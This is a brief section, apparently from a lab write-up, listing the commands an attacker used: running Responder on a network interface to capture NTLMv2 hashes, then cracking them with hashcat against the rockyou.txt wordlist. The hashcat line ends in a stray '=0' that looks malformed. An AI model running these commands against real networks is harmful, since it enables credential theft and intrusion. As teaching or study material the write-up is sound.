## ATTACKER COMMANDS

The following are the commands the attacker used while carrying out this attack:

#### Run the responder

```sudo responder -I eth0 -wFd```

The flag '-I' is the network interface you want Responder to listen on.

#### Crack the hash using the rockyou.txt dictionary

```hashcat -m 5600 hashfile.txt rockyou.txt =0```
